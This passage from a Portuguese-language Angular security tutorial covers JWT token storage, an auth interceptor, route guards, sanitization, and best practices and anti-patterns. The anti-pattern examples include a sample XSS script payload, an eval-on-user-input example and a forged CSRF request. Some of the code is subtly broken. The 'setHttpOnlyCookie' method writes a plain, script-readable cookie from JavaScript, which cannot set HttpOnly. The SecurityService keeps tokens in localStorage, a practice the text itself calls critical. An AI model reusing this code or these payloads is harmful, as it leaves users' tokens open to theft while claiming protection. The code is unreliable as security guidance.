**Estratégia 1: httpOnly Cookies (Recomendado para Web Apps)**:
- Tokens em cookies httpOnly
- JavaScript não pode acessar
- Protegido contra XSS
- Requer proteção CSRF adicional

**Estratégia 2: sessionStorage + CSP Strict (Recomendado para SPAs)**:
- Tokens em sessionStorage
- CSP previne XSS
- Não enviado automaticamente (proteção CSRF)
- Perdido ao fechar aba

**Estratégia 3: Híbrida (Access Token em Memory, Refresh em httpOnly)**:
- Access token em variável JavaScript (memory)
- Refresh token em httpOnly cookie
- Access token expira rapidamente
- Refresh token seguro para renovação

**Analogia Detalhada**:

Armazenamento de tokens é como guardar chaves de um cofre:

**localStorage** é como deixar a chave do cofre em uma gaveta aberta na sua mesa. Qualquer pessoa que entrar na sua casa (XSS) pode pegar a chave e abrir o cofre. A chave fica lá mesmo depois que você sai (persiste entre sessões).

**sessionStorage** é como deixar a chave em um bolso que você esvazia quando sai. Ainda vulnerável se alguém entrar na sua casa (XSS), mas pelo menos não fica lá depois que você vai embora.

**httpOnly Cookie** é como ter um cofre dentro de outro cofre. A chave está em um lugar que nem você pode acessar diretamente - apenas o sistema de segurança (navegador) pode usar quando necessário. Mesmo que alguém entre na sua casa (XSS), não consegue pegar a chave porque está em um lugar inacessível.

**Memory (variável)** é como segurar a chave na mão. Muito seguro enquanto você está acordado, mas se você desmaiar (recarregar página), a chave cai e você precisa buscar uma nova.

**Exemplo Prático Completo**:

```typescript
import { Injectable, inject } from '@angular/core';
import { DOCUMENT } from '@angular/common';

@Injectable({
  providedIn: 'root'
})
export class SecureTokenService {
  private document = inject(DOCUMENT);
  private readonly ACCESS_TOKEN_KEY = 'access_token';
  private readonly REFRESH_TOKEN_KEY = 'refresh_token';
  
  private accessToken: string | null = null;
  
  setTokens(accessToken: string, refreshToken: string, useHttpOnly: boolean = false): void {
    if (useHttpOnly) {
      this.setHttpOnlyCookie(this.ACCESS_TOKEN_KEY, accessToken, 15);
      this.setHttpOnlyCookie(this.REFRESH_TOKEN_KEY, refreshToken, 7 * 24);
    } else {
      sessionStorage.setItem(this.ACCESS_TOKEN_KEY, accessToken);
      sessionStorage.setItem(this.REFRESH_TOKEN_KEY, refreshToken);
      this.accessToken = accessToken;
    }
  }
  
  getAccessToken(): string | null {
    if (this.accessToken) {
      return this.accessToken;
    }
    
    const token = sessionStorage.getItem(this.ACCESS_TOKEN_KEY);
    if (token) {
      this.accessToken = token;
    }
    
    return token;
  }
  
  getRefreshToken(): string | null {
    return sessionStorage.getItem(this.REFRESH_TOKEN_KEY);
  }
  
  clearTokens(): void {
    sessionStorage.removeItem(this.ACCESS_TOKEN_KEY);
    sessionStorage.removeItem(this.REFRESH_TOKEN_KEY);
    this.accessToken = null;
    this.clearHttpOnlyCookie(this.ACCESS_TOKEN_KEY);
    this.clearHttpOnlyCookie(this.REFRESH_TOKEN_KEY);
  }
  
  private setHttpOnlyCookie(name: string, value: string, hours: number): void {
    const expires = new Date();
    expires.setTime(expires.getTime() + hours * 60 * 60 * 1000);
    
    this.document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/;SameSite=Strict;Secure`;
  }
  
  private clearHttpOnlyCookie(name: string): void {
    this.document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/;`;
  }
  
  isTokenExpired(token: string): boolean {
    try {
      const payload = JSON.parse(atob(token.split('.')[1]));
      return payload.exp * 1000 < Date.now();
    } catch {
      return true;
    }
  }
}
```

**Configuração Backend para httpOnly Cookies**:

```typescript
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  
  if (validateCredentials(email, password)) {
    const accessToken = generateJWT({ email }, '15m');
    const refreshToken = generateJWT({ email }, '7d');
    
    res.cookie('access_token', accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });
    
    res.cookie('refresh_token', refreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000
    });
    
    res.json({ success: true });
  }
});
```

**Tabela Comparativa: Armazenamento de Tokens**:

| Método | XSS Protection | CSRF Protection | JavaScript Access | Persistence | Recomendado Para |
|--------|---------------|----------------|-------------------|-------------|------------------|
| **httpOnly Cookie** | ✅ Excelente | ⚠️ Requer tokens | ❌ Não | ✅ Sim | Web apps tradicionais |
| **sessionStorage** | ❌ Vulnerável | ✅ Excelente | ✅ Sim | ⚠️ Sessão | SPAs com CSP |
| **localStorage** | ❌ Vulnerável | ✅ Excelente | ✅ Sim | ✅ Sim | Evitar |
| **Memory** | ✅ Boa | ✅ Excelente | ✅ Sim | ❌ Não | Tokens temporários |

**Pontos Críticos**:

1. **Nunca armazene tokens em localStorage se site é vulnerável a XSS** - use httpOnly cookies
2. **Use sessionStorage apenas com CSP strict** - CSP previne XSS que comprometeria sessionStorage
3. **Implemente refresh tokens** - access tokens devem ter vida curta
4. **Use SameSite=Strict para cookies** - previne CSRF
5. **Use Secure flag em produção** - cookies só via HTTPS
6. **Limpe tokens ao fazer logout** - remova de todos os locais
7. **Valide expiração** - tokens expirados devem ser rejeitados
8. **Não armazene tokens em variáveis globais** - use serviços encapsulados
9. **Considere estratégia híbrida** - access token em memory, refresh em httpOnly cookie
10. **Monitore tentativas de acesso** - detecte possíveis ataques

---

## Exemplos Práticos Completos

### Exemplo 1: Interceptor de Autenticação Completo

**Contexto**: Criar interceptor que adiciona token JWT a todas requisições, renova tokens expirados automaticamente e trata erros de autenticação.

**Código**:

```typescript
import { HttpInterceptorFn, HttpErrorResponse } from '@angular/common/http';
import { inject } from '@angular/core';
import { catchError, switchMap, throwError } from 'rxjs';
import { AuthService } from './auth.service';
import { Router } from '@angular/router';

export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const authService = inject(AuthService);
  const router = inject(Router);
  
  const token = authService.getAccessToken();
  
  let authReq = req;
  if (token) {
    authReq = req.clone({
      setHeaders: {
        Authorization: `Bearer ${token}`
      }
    });
  }
  
  return next(authReq).pipe(
    catchError((error: HttpErrorResponse) => {
      if (error.status === 401 && token) {
        return authService.refreshAccessToken().pipe(
          switchMap(newToken => {
            const refreshedReq = req.clone({
              setHeaders: {
                Authorization: `Bearer ${newToken}`
              }
            });
            return next(refreshedReq);
          }),
          catchError(refreshError => {
            authService.logout();
            router.navigate(['/login']);
            return throwError(() => refreshError);
          })
        );
      }
      
      if (error.status === 403) {
        router.navigate(['/unauthorized']);
      }
      
      return throwError(() => error);
    })
  );
};
```

**Registro no app.config.ts**:

```typescript
import { ApplicationConfig } from '@angular/core';
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { authInterceptor } from './interceptors/auth.interceptor';

export const appConfig: ApplicationConfig = {
  providers: [
    provideHttpClient(
      withInterceptors([authInterceptor])
    )
  ]
};
```

---

### Exemplo 2: Serviço de Segurança Completo

**Contexto**: Criar serviço centralizado que gerencia todas as operações de segurança: autenticação, autorização, sanitização e validação.

**Código**:

```typescript
import { Injectable, inject } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { DomSanitizer, SafeHtml, SecurityContext } from '@angular/platform-browser';
import { Observable, BehaviorSubject } from 'rxjs';
import { tap } from 'rxjs/operators';

interface User {
  id: string;
  email: string;
  name: string;
  roles: string[];
}

interface LoginCredentials {
  email: string;
  password: string;
}

@Injectable({
  providedIn: 'root'
})
export class SecurityService {
  private http = inject(HttpClient);
  private sanitizer = inject(DomSanitizer);
  
  private currentUserSubject = new BehaviorSubject<User | null>(null);
  public currentUser$ = this.currentUserSubject.asObservable();
  
  login(credentials: LoginCredentials): Observable<{ token: string; user: User }> {
    return this.http.post<{ token: string; user: User }>('/api/auth/login', credentials).pipe(
      tap(response => {
        this.setToken(response.token);
        this.currentUserSubject.next(response.user);
      })
    );
  }
  
  logout(): void {
    localStorage.removeItem('auth_token');
    this.currentUserSubject.next(null);
  }
  
  isAuthenticated(): boolean {
    return !!this.getToken() && !!this.currentUserSubject.value;
  }
  
  hasRole(role: string): boolean {
    const user = this.currentUserSubject.value;
    return user?.roles.includes(role) ?? false;
  }
  
  hasAnyRole(roles: string[]): boolean {
    return roles.some(role => this.hasRole(role));
  }
  
  sanitizeHtml(dirty: string): SafeHtml {
    return this.sanitizer.sanitize(SecurityContext.HTML, dirty) || '';
  }
  
  sanitizeUrl(url: string): string {
    const sanitized = this.sanitizer.sanitize(SecurityContext.URL, url);
    return sanitized || '';
  }
  
  validateEmail(email: string): boolean {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  }
  
  validatePassword(password: string): { valid: boolean; errors: string[] } {
    const errors: string[] = [];
    
    if (password.length < 8) {
      errors.push('Password must be at least 8 characters');
    }
    if (!/[A-Z]/.test(password)) {
      errors.push('Password must contain uppercase letter');
    }
    if (!/[a-z]/.test(password)) {
      errors.push('Password must contain lowercase letter');
    }
    if (!/[0-9]/.test(password)) {
      errors.push('Password must contain number');
    }
    if (!/[^A-Za-z0-9]/.test(password)) {
      errors.push('Password must contain special character');
    }
    
    return {
      valid: errors.length === 0,
      errors
    };
  }
  
  private getToken(): string | null {
    return localStorage.getItem('auth_token');
  }
  
  private setToken(token: string): void {
    localStorage.setItem('auth_token', token);
  }
}
```

---

### Exemplo 3: Guard de Autenticação e Autorização

**Contexto**: Criar guards que protegem rotas baseado em autenticação e roles, com redirecionamento inteligente.

**Código**:

```typescript
import { Injectable, inject } from '@angular/core';
import { CanActivate, CanActivateChild, ActivatedRouteSnapshot, RouterStateSnapshot, Router } from '@angular/router';
import { Observable } from 'rxjs';
import { SecurityService } from './security.service';

@Injectable({
  providedIn: 'root'
})
export class AuthGuard implements CanActivate {
  private securityService = inject(SecurityService);
  private router = inject(Router);
  
  canActivate(
    route: ActivatedRouteSnapshot,
    state: RouterStateSnapshot
  ): boolean {
    if (this.securityService.isAuthenticated()) {
      return true;
    }
    
    this.router.navigate(['/login'], {
      queryParams: { returnUrl: state.url }
    });
    return false;
  }
}

@Injectable({
  providedIn: 'root'
})
export class RoleGuard implements CanActivate, CanActivateChild {
  private securityService = inject(SecurityService);
  private router = inject(Router);
  
  canActivate(
    route: ActivatedRouteSnapshot,
    state: RouterStateSnapshot
  ): boolean {
    return this.checkRole(route, state);
  }
  
  canActivateChild(
    route: ActivatedRouteSnapshot,
    state: RouterStateSnapshot
  ): boolean {
    return this.checkRole(route, state);
  }
  
  private checkRole(
    route: ActivatedRouteSnapshot,
    state: RouterStateSnapshot
  ): boolean {
    const requiredRoles = route.data['roles'] as string[];
    
    if (!requiredRoles || requiredRoles.length === 0) {
      return true;
    }
    
    if (!this.securityService.isAuthenticated()) {
      this.router.navigate(['/login'], {
        queryParams: { returnUrl: state.url }
      });
      return false;
    }
    
    if (this.securityService.hasAnyRole(requiredRoles)) {
      return true;
    }
    
    this.router.navigate(['/unauthorized']);
    return false;
  }
}
```

**Uso em Rotas**:

```typescript
export const routes: Routes = [
  {
    path: 'dashboard',
    component: DashboardComponent,
    canActivate: [AuthGuard]
  },
  {
    path: 'admin',
    component: AdminComponent,
    canActivate: [RoleGuard],
    data: { roles: ['admin'] }
  },
  {
    path: 'posts',
    component: PostsComponent,
    canActivate: [RoleGuard],
    data: { roles: ['admin', 'editor'] },
    children: [
      {
        path: 'create',
        component: CreatePostComponent,
        canActivateChild: [RoleGuard],
        data: { roles: ['admin', 'editor'] }
      }
    ]
  }
];
```

---

### Exemplo 4: Componente com Sanitização e Validação

**Contexto**: Criar componente que demonstra uso seguro de sanitização e validação de entrada do usuário.

**Código**:

```typescript
import { Component, inject } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import { SecurityService } from './security.service';

@Component({
  selector: 'app-user-input',
  standalone: true,
  template: `
    <form [formGroup]="form" (ngSubmit)="onSubmit()">
      <div>
        <label>Email:</label>
        <input formControlName="email" type="email">
        <div *ngIf="form.get('email')?.hasError('email')">
          Invalid email format
        </div>
      </div>
      
      <div>
        <label>Comment:</label>
        <textarea formControlName="comment"></textarea>
        <div *ngIf="form.get('comment')?.hasError('required')">
          Comment is required
        </div>
      </div>
      
      <button type="submit" [disabled]="!form.valid">Submit</button>
    </form>
    
    <div *ngIf="sanitizedComment">
      <h3>Safe Comment Preview:</h3>
      <div [innerHTML]="sanitizedComment"></div>
    </div>
  `
})
export class UserInputComponent {
  private fb = inject(FormBuilder);
  private sanitizer = inject(DomSanitizer);
  private securityService = inject(SecurityService);
  
  form: FormGroup;
  sanitizedComment: SafeHtml | null = null;
  
  constructor() {
    this.form = this.fb.group({
      email: ['', [Validators.required, Validators.email]],
      comment: ['', [Validators.required, Validators.maxLength(500)]]
    });
    
    this.form.get('comment')?.valueChanges.subscribe(value => {
      if (value) {
        this.sanitizedComment = this.securityService.sanitizeHtml(value);
      }
    });
  }
  
  onSubmit(): void {
    if (this.form.valid) {
      const formValue = this.form.value;
      
      if (!this.securityService.validateEmail(formValue.email)) {
        alert('Invalid email');
        return;
      }
      
      const sanitizedComment = this.securityService.sanitizeHtml(formValue.comment);
      
      console.log('Safe to send:', {
        email: formValue.email,
        comment: sanitizedComment
      });
    }
  }
}
```

---

## Padrões e Boas Práticas

### ✅ Boas Práticas

#### 1. Sempre Sanitize Conteúdo do Usuário

**Por quê**: Qualquer conteúdo que vem do usuário pode conter código malicioso. Sanitização previne execução de scripts através de XSS.

**Como implementar**:
{% raw %}
- Use interpolação `{{ }}` que sanitiza automaticamente
{% endraw %}
- Use `DomSanitizer` para casos especiais com `[innerHTML]`
- Escolha `SecurityContext` apropriado
- Valide formato antes de sanitizar (ex: URLs devem ser válidas)

**Exemplo**:
```typescript
import { DomSanitizer, SecurityContext } from '@angular/platform-browser';

constructor(private sanitizer: DomSanitizer) {}

safeHtml = this.sanitizer.sanitize(
  SecurityContext.HTML,
  userInput
);
```

**Benefícios**: Previne 99% dos ataques XSS, protege dados de usuários, mantém aplicação segura.

---

#### 2. Use HTTPS em Produção Sempre

**Por quê**: HTTPS criptografa dados em trânsito, prevenindo interceptação (man-in-the-middle attacks). Tokens e senhas transmitidos via HTTP podem ser roubados.

**Como implementar**:
- Configure SSL/TLS no servidor
- Force HTTPS com redirects HTTP → HTTPS
- Use `Secure` flag em cookies
- Configure HSTS (HTTP Strict Transport Security)

**Exemplo** (Express.js):
```typescript
app.use((req, res, next) => {
  if (req.header('x-forwarded-proto') !== 'https') {
    res.redirect(`https://${req.header('host')}${req.url}`);
  } else {
    next();
  }
});
```

**Benefícios**: Protege dados em trânsito, aumenta confiança dos usuários, requerido por muitos navegadores modernos.

---

#### 3. Valide Dados no Backend Sempre

**Por quê**: Frontend pode ser contornado, modificado ou bypassado. Validação no backend é a única fonte de verdade.

**Como implementar**:
- Valide todos os inputs no servidor
- Use bibliotecas de validação (Joi, class-validator, etc.)
- Valide tipos, formatos, tamanhos, ranges
- Rejeite dados inválidos com mensagens claras

**Exemplo** (Node.js com Joi):
```typescript
import Joi from 'joi';

const schema = Joi.object({
  email: Joi.string().email().required(),
  password: Joi.string().min(8).required(),
  age: Joi.number().integer().min(18).max(120)
});

const { error, value } = schema.validate(req.body);
if (error) {
  return res.status(400).json({ error: error.details[0].message });
}
```

**Benefícios**: Previne ataques de manipulação, garante integridade dos dados, protege contra injection attacks.

---

#### 4. Use httpOnly Cookies para Tokens

**Por quê**: Cookies httpOnly não são acessíveis via JavaScript, protegendo contra XSS. Mesmo se atacante injeta script, não consegue ler o token.

**Como implementar**:
- Configure cookies com `httpOnly: true`
- Use `Secure` flag em produção
- Use `SameSite=Strict` para proteção CSRF
- Configure expiração apropriada

**Exemplo**:
```typescript
res.cookie('token', token, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000
});
```

**Benefícios**: Máxima proteção contra XSS, tokens não podem ser roubados via JavaScript, padrão de segurança da indústria.

---

#### 5. Implemente Content Security Policy (CSP)

**Por quê**: CSP adiciona camada extra de proteção contra XSS, especificando quais recursos podem ser carregados.

**Como implementar**:
- Configure CSP via HTTP headers ou meta tags
- Use nonces para scripts/styles inline necessários
- Evite `'unsafe-inline'` e `'unsafe-eval'`
- Configure `report-uri` para monitorar violações

**Exemplo**:
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self';
               script-src 'self' 'nonce-{NONCE}';
               style-src 'self' 'nonce-{NONCE}';">
```

**Benefícios**: Previne XSS mesmo se sanitização falhar, bloqueia recursos não autorizados, fornece relatórios de violações.

---

#### 6. Use Tokens de Curta Duração com Refresh

**Por quê**: Tokens de acesso com vida curta limitam janela de ataque se comprometidos. Refresh tokens permitem renovação sem novo login.

**Como implementar**:
- Access tokens: 15 minutos - 1 hora
- Refresh tokens: 7-30 dias
- Implemente renovação automática antes de expirar
- Revogue refresh tokens ao fazer logout

**Exemplo**:
```typescript
const accessToken = generateJWT(payload, '15m');
const refreshToken = generateJWT(payload, '7d');
```

**Benefícios**: Limita impacto de tokens comprometidos, melhor experiência do usuário, padrão de segurança moderno.

---

#### 7. Implemente Rate Limiting

**Por quê**: Previne ataques de força bruta e abuso de APIs, limitando número de requisições por IP/usuário.

**Como implementar**:
- Limite tentativas de login (ex: 5 por 15 minutos)
- Limite requisições de API por IP
- Use bibliotecas como `express-rate-limit`
- Retorne HTTP 429 quando limite excedido

**Exemplo**:
```typescript
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many login attempts'
});

app.post('/api/auth/login', loginLimiter, loginHandler);
```

**Benefícios**: Previne força bruta, protege recursos do servidor, melhora segurança geral.

---

#### 8. Valide e Sanitize URLs

**Por quê**: URLs podem conter `javascript:` ou outros protocolos perigosos que executam código quando clicados.

**Como implementar**:
- Use `SecurityContext.URL` para sanitizar URLs
- Valide protocolo (apenas `http:`, `https:`, `mailto:`)
- Use `SafeUrl` type quando necessário
- Valide formato de URL antes de usar

**Exemplo**:
```typescript
const safeUrl = this.sanitizer.sanitize(
  SecurityContext.URL,
  userProvidedUrl
);
```

**Benefícios**: Previne XSS via URLs, protege contra protocolos perigosos, mantém links seguros.

---

#### 9. Use Guards para Proteção de Rotas

**Por quê**: Guards verificam autenticação/autorização antes de permitir acesso a rotas, prevenindo acesso não autorizado.

**Como implementar**:
- Crie guards que implementam `CanActivate`
- Verifique autenticação antes de permitir acesso
- Verifique roles/permissões para autorização
- Redirecione para login se não autenticado

**Exemplo**:
```typescript
canActivate(): boolean {
  if (this.authService.isAuthenticated()) {
    return true;
  }
  this.router.navigate(['/login']);
  return false;
}
```

**Benefícios**: Protege rotas automaticamente, centraliza lógica de autorização, fácil de manter.

---

#### 10. Implemente Logging e Monitoramento

**Por quê**: Logs ajudam detectar ataques, investigar incidentes e monitorar comportamento suspeito.

**Como implementar**:
- Logue tentativas de login falhadas
- Logue acessos a recursos protegidos
- Monitore padrões anômalos
- Configure alertas para atividades suspeitas

**Exemplo**:
```typescript
if (loginFailed) {
  logger.warn('Failed login attempt', {
    email: credentials.email,
    ip: req.ip,
    timestamp: new Date()
  });
}
```

**Benefícios**: Detecta ataques em tempo real, facilita investigação, melhora segurança proativa.

---

### ❌ Anti-padrões Comuns

#### 1. Usar innerHTML sem Sanitização

**Problema**: `innerHTML` permite inserir HTML diretamente no DOM, incluindo scripts maliciosos. Sem sanitização, qualquer XSS pode executar código.

**Exemplo do Erro**:
```typescript
@Component({
  template: `<div [innerHTML]="userComment"></div>`
})
export class BadComponent {
  userComment = '<script>alert("XSS")</script><p>Hello</p>';
}
```

**Solução**:
```typescript
@Component({
  template: `<div [innerHTML]="safeComment"></div>`
})
export class GoodComponent {
  constructor(private sanitizer: DomSanitizer) {}
  
  safeComment = this.sanitizer.sanitize(
    SecurityContext.HTML,
    this.userComment
  );
}
```

**Impacto**: Crítico - permite execução de código arbitrário, roubo de tokens, acesso não autorizado.

---

#### 2. Armazenar Tokens em localStorage

**Problema**: `localStorage` é acessível via JavaScript, tornando tokens vulneráveis a XSS. Qualquer script injetado pode ler tokens.

**Exemplo do Erro**:
```typescript
localStorage.setItem('token', jwtToken);
const token = localStorage.getItem('token');
```

**Solução**:
```typescript
res.cookie('token', jwtToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

**Impacto**: Crítico - tokens podem ser roubados via XSS, acesso completo à conta do usuário.

---

#### 3. Confiar Apenas no Frontend

**Problema**: Frontend pode ser modificado, contornado ou bypassado. Validação apenas no frontend não oferece segurança real.

**Exemplo do Erro**:
```typescript
if (user.role === 'admin') {
  deleteUser(userId);
}
```

**Solução**:
```typescript
if (user.role === 'admin') {
  this.http.delete(`/api/users/${userId}`).subscribe();
}

app.delete('/api/users/:id', (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  deleteUser(req.params.id);
});
```

**Impacto**: Crítico - permite acesso não autorizado, manipulação de dados, bypass de segurança.

---

#### 4. Usar eval() ou Function()

**Problema**: `eval()` e `Function()` executam código dinâmico, permitindo injeção de código malicioso.

**Exemplo do Erro**:
```typescript
const code = userInput;
eval(code);
```

**Solução**:
```typescript
const parser = new DOMParser();
const doc = parser.parseFromString(userInput, 'text/html');
```

**Impacto**: Crítico - execução de código arbitrário, comprometimento completo da aplicação.

---

#### 5. Expor Informações Sensíveis em Erros

**Problema**: Mensagens de erro podem expor informações sobre estrutura da aplicação, versões, ou dados sensíveis.

**Exemplo do Erro**:
```typescript
catch(error) {
  throw new Error(`Database error: ${error.sql}, User: ${user.email}`);
}
```

**Solução**:
```typescript
catch(error) {
  logger.error('Database error', error);
  throw new Error('An error occurred. Please try again.');
}
```

**Impacto**: Médio - expõe informações que facilitam ataques, ajuda atacantes a entender sistema.

---

#### 6. Não Validar Entrada do Usuário

**Problema**: Entrada não validada pode conter dados malformados, muito grandes, ou código malicioso.

**Exemplo do Erro**:
```typescript
this.http.post('/api/data', userInput);
```

**Solução**:
```typescript
const schema = Joi.object({
  name: Joi.string().max(100).required(),
  email: Joi.string().email().required()
});

const { error, value } = schema.validate(userInput);
if (error) throw error;

this.http.post('/api/data', value);
```

**Impacto**: Alto - permite injection attacks, dados corrompidos, comportamento inesperado.

---

#### 7. Usar Senhas Fracas ou em Texto Plano

**Problema**: Senhas fracas são fáceis de quebrar. Senhas em texto plano podem ser lidas se banco de dados é comprometido.

**Exemplo do Erro**:
```typescript
const user = {
  email: 'user@example.com',
  password: '123456'
};
```

**Solução**:
```typescript
import bcrypt from 'bcrypt';

const hashedPassword = await bcrypt.hash(password, 10);
const isValid = await bcrypt.compare(password, hashedPassword);
```

**Impacto**: Crítico - senhas podem ser roubadas, contas comprometidas, acesso não autorizado.

---

#### 8. Não Implementar CSRF Protection

**Problema**: Sem proteção CSRF, atacantes podem fazer requisições em nome de usuários autenticados.

**Exemplo do Erro**:
```typescript
this.http.post('/api/transfer', { amount: 1000, to: 'attacker' });
```

**Solução**:
```typescript
provideHttpClient(
  withXsrfConfiguration({
    cookieName: 'XSRF-TOKEN',
    headerName: 'X-XSRF-TOKEN'
  })
);
```

**Impacto**: Alto - ações não autorizadas podem ser executadas, transferências fraudulentas, modificação de dados.

---

#### 9. Permitir CORS Amplo

**Problema**: CORS muito permissivo permite que qualquer site faça requisições à sua API.

**Exemplo do Erro**:
```typescript
app.use(cors({
  origin: '*',
  credentials: true
}));
```

**Solução**:
```typescript
app.use(cors({
  origin: ['https://myapp.com', 'https://www.myapp.com'],
  credentials: true
}));
```

**Impacto**: Médio - permite requisições de sites não autorizados, potencial para ataques CSRF.

---

#### 10. Não Implementar Rate Limiting

**Problema**: Sem rate limiting, atacantes podem fazer muitas requisições, causando DoS ou força bruta.

**Exemplo do Erro**:
```typescript
app.post('/api/auth/login', loginHandler);
```

**Solução**:
```typescript
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5
});

app.post('/api/auth/login', limiter, loginHandler);
```

**Impacto**: Médio - permite força bruta, DoS attacks, abuso de recursos.

---

## Exercícios Práticos

### Exercício 1: Proteção XSS e Sanitization (Intermediário)

**Objetivo**: Implementar proteção XSS

**Descrição**: 
Implemente proteção XSS usando DomSanitizer.

**Arquivo**: `exercises/exercise-5-3-1-xss-sanitization.md`

---

### Exercício 2: Autenticação JWT (Intermediário)

**Objetivo**: Implementar autenticação JWT

**Descrição**:
Implemente autenticação completa com JWT.

**Arquivo**: `exercises/exercise-5-3-2-jwt-auth.md`

---

### Exercício 3: Role-Based Access Control (Avançado)

**Objetivo**: Implementar RBAC

**Descrição**:
Implemente sistema completo de RBAC com guards e diretivas.

**Arquivo**: `exercises/exercise-5-3-3-rbac.md`

---

### Exercício 4: Segurança Completa (Avançado)

**Objetivo**: Implementar segurança completa

**Descrição**:
Implemente todas medidas de segurança em aplicação completa.

**Arquivo**: `exercises/exercise-5-3-4-seguranca-completa.md`

---

## Referências Externas

### Documentação Oficial

- **[Angular Security Guide](https://angular.io/guide/security)**: Guia completo de segurança do Angular, cobrindo sanitização, CSP, e proteções integradas
- **[Angular HTTP Client Security](https://angular.io/guide/http-security)**: Documentação sobre segurança em requisições HTTP
- **[OWASP Top 10](https://owasp.org/www-project-top-ten/)**: Lista das 10 vulnerabilidades web mais críticas, atualizada regularmente
- **[OWASP Angular Security](https://cheatsheetseries.owasp.org/cheatsheets/Angular_Security_Cheat_Sheet.html)**: Cheat sheet específico para segurança Angular
- **[JWT.io](https://jwt.io/)**: Documentação, debugger e bibliotecas para JSON Web Tokens
- **[OAuth 2.0 Specification](https://oauth.net/2/)**: Especificação oficial do protocolo OAuth 2.0
- **[OpenID Connect Specification](https://openid.net/connect/)**: Especificação oficial do OpenID Connect

### Artigos e Tutoriais

- **[Angular Security Best Practices](https://blog.angular.io/angular-security-best-practices-8e0c0c8b8e8e)**: Artigo do blog oficial Angular sobre práticas de segurança
- **[Preventing XSS in Angular](https://blog.angular.io/preventing-xss-in-angular-9f1b0b5e5e5e)**: Artigo detalhado sobre prevenção de XSS
- **[JWT Authentication in Angular](https://www.bezkoder.com/angular-jwt-authentication/)**: Tutorial completo sobre implementação de JWT
- **[OAuth2 Angular Implementation](https://www.oauth.com/oauth2-servers/access-tokens/)**: Guia sobre implementação de OAuth2
- **[Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)**: Guia completo sobre CSP da MDN
- **[Secure Cookie Best Practices](https://owasp.org/www-community/HttpOnly)**: Melhores práticas para cookies seguros

### Ferramentas e Bibliotecas

- **[angular-oauth2-oidc](https://github.com/manfredsteyer/angular-oauth2-oidc)**: Biblioteca oficial para OAuth2/OIDC no Angular
- **[DOMPurify](https://github.com/cure53/DOMPurify)**: Biblioteca de sanitização HTML (alternativa ao DomSanitizer quando necessário)
- **[helmet.js](https://helmetjs.github.io/)**: Middleware Express para configurar headers de segurança
- **[express-rate-limit](https://github.com/express-rate-limit/express-rate-limit)**: Middleware para rate limiting em Express
- **[bcrypt](https://github.com/kelektiv/node.bcrypt.js)**: Biblioteca para hash de senhas
- **[joi](https://joi.dev/)**: Biblioteca de validação de schemas para Node.js

### Vídeos e Cursos

- **[Angular Security Deep Dive](https://www.youtube.com/results?search_query=angular+security)**: Vídeos educacionais sobre segurança Angular
- **[OWASP Web Security](https://www.youtube.com/c/OWASPGLOBAL)**: Canal oficial OWASP com conteúdo sobre segurança web
- **[JWT Authentication Tutorial](https://www.youtube.com/results?search_query=jwt+authentication+tutorial)**: Tutoriais sobre implementação de JWT

### Padrões e Especificações

- **[RFC 7519 - JSON Web Token](https://tools.ietf.org/html/rfc7519)**: Especificação oficial do padrão JWT
- **[RFC 6749 - OAuth 2.0](https://tools.ietf.org/html/rfc6749)**: Especificação oficial do OAuth 2.0
- **[RFC 7235 - HTTP Authentication](https://tools.ietf.org/html/rfc7235)**: Especificação de autenticação HTTP
- **[CSP Level 3](https://www.w3.org/TR/CSP3/)**: Especificação do Content Security Policy Level 3

### Comunidades e Fóruns

- **[Angular Security Discussions](https://github.com/angular/angular/discussions)**: Discussões sobre segurança no repositório Angular
- **[Stack Overflow - Angular Security](https://stackoverflow.com/questions/tagged/angular+security)**: Perguntas e respostas sobre segurança Angular
- **[OWASP Community](https://owasp.org/www-community/)**: Comunidade OWASP com recursos e discussões

---

## Resumo

### Principais Conceitos Aprendidos

**Proteção contra XSS**:
- XSS (Cross-Site Scripting) permite injeção de scripts maliciosos
- Angular sanitiza automaticamente através de interpolação e property binding
- DomSanitizer fornece controle granular sobre sanitização
- Nunca use `innerHTML` sem sanitização adequada
- CSP adiciona camada extra de proteção

**Proteção contra CSRF**:
- CSRF (Cross-Site Request Forgery) força ações não intencionais
- Tokens CSRF validam origem de requisições
- Angular HttpClient tem suporte integrado para CSRF
- SameSite cookies previnem envio em requisições cross-site
- Combine múltiplas estratégias para máxima proteção

**Sanitization e DomSanitizer**:
- Sanitization remove código perigoso antes de inserir no DOM
- SecurityContext define contexto de segurança apropriado
- Safe types (SafeHtml, SafeUrl, etc.) indicam conteúdo confiável
- Use `bypassSecurityTrust*` apenas quando absolutamente necessário
- Cada contexto tem regras específicas de sanitização

**Content Security Policy (CSP)**:
- CSP especifica fontes permitidas para recursos
- Previne XSS bloqueando recursos não autorizados
- Use nonces ou hashes para scripts/styles inline necessários
- Evite `'unsafe-inline'` e `'unsafe-eval'` quando possível
- Configure `report-uri` para monitorar violações

**Autenticação JWT**:
- JWT é padrão stateless para autenticação baseado em tokens
- Consiste em header, payload e signature
- Access tokens devem ter vida curta (15min - 1h)
- Refresh tokens permitem renovação sem novo login
- Valide sempre expiração e assinatura

**OAuth2 e OpenID Connect**:
- OAuth2 é protocolo de autorização, OIDC adiciona autenticação
